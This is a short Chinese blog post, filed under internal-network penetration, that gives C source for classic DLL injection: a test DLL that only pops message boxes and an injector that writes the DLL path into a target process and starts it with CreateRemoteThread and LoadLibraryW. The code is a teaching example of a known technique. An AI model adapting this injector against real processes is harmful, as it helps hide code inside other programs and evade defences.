---
categories: 内网渗透
date: "2019-01-20T00:00:00Z"
description: DLL Injection 示例代码
title: DLL Injection Example
url: /archivers/2019-01-20/
---

![2019-01-20-16-41-10](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/bda28c76cf819b7e4937b62ff6f138ef.png)

![2019-01-20-16-41-18](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/34456eb264aeede6cd804d142421a1ee.png)


Project1.dll:

```c

#include <Windows.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:    
        MessageBox(NULL, TEXT("DLL_PROCESS_ATTACH"), TEXT("成功了"), NULL);
        break;
    case DLL_THREAD_ATTACH:
		MessageBox(NULL, TEXT("DLL_THREAD_ATTACH"), TEXT("成功了"), NULL);
		break;
    case DLL_THREAD_DETACH:
		MessageBox(NULL, TEXT("DLL_THREAD_DETACH"), TEXT("成功了"), NULL);
		break;
    case DLL_PROCESS_DETACH:
		MessageBox(NULL, TEXT("DLL_PROCESS_DETACH"), TEXT("成功了"), NULL);
        break;
    }
    return TRUE;
}

```


Injection.exe:

```c


#include <Windows.h>
#include <stdio.h>

//根据进程ID获取进程句柄
HANDLE GetProcessHandle(DWORD deProcessID)
{
    HANDLE hProcess = OpenProcess(
        PROCESS_QUERY_INFORMATION  //查询进程句柄
        | PROCESS_VM_OPERATION     //PROCESS_VM_WRITE + PROCESS_VM_READ + x 
        | PROCESS_CREATE_THREAD    //创建线程
        | PROCESS_VM_WRITE,        //WriteProcessMemory
        FALSE,                     //不继承
        deProcessID                //进程句柄
        ); 

    return hProcess;
}

int main(int argc, TCHAR * argv[])
{
    DWORD dwErrCode = 0;


	// 进程PID
    DWORD dwProcessID = 1712;
    
    HANDLE hDestProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcessID);
    if(NULL == hDestProcess) 
    {
        printf("open process error \n");
        return 0;
    }


    //获取KERNER32.DLL 模块句柄
    HMODULE hModule = GetModuleHandle(TEXT("kernel32.dll")); 
    if(NULL == hModule) 
    {
        printf("kernel32.dll \n");
        return -1;
    }

    //线程函数，kernerl32.dll被映射到所有进程内相同的地址
    LPTHREAD_START_ROUTINE lpThreadStartRoutine = 
                         (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, "LoadLibraryW");

    if(NULL == lpThreadStartRoutine) 
    {
		printf("LoadLibraryW Error \n");
       
        return -2; 
    }

    //从目标进程内申请堆内存
    LPVOID lpMemory = VirtualAllocEx(
                     hDestProcess, NULL, MAX_PATH, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);  
    if(NULL == lpMemory) 
    {
		printf("VirtualAllocEx Error\n");
        return -3;
    }

    //注入DLL
    LPCTSTR lpDLLName = TEXT("C:\\Users\\Rvn0xsy\\Project1.dll");

    //把DLL名字写入目标进程
    BOOL bWriteMemory = WriteProcessMemory(
        hDestProcess, lpMemory, lpDLLName, (lstrlenW(lpDLLName) + 1) * sizeof(lpDLLName[0]), NULL);
	//wprintf((LPWSTR)lpMemory);
    if(FALSE == bWriteMemory) 
    {
       
		printf("WriteProcessMemory Error \n");
        dwErrCode = GetLastError();
        VirtualFreeEx(hModule, lpMemory, 0, MEM_RELEASE | MEM_DECOMMIT);
        return -4;
    }
 

    //创建远程线程
    HANDLE hThread = CreateRemoteThread(
        hDestProcess, 
        NULL,
        0,
        lpThreadStartRoutine,
        lpMemory,
        0,
        NULL);
    if (NULL == hThread || INVALID_HANDLE_VALUE == hThread)
    {
		printf("CreateRomoteThread Error %d \n",GetLastError());
        VirtualFreeEx(hModule, lpMemory, 0, MEM_RELEASE | MEM_DECOMMIT);
        return -5;
    }



    VirtualFreeEx(hModule, lpMemory, 0, MEM_RELEASE | MEM_DECOMMIT);  

    return 0;
}

```

REF:https://www.cnblogs.com/HsinTsao/p/6528053.html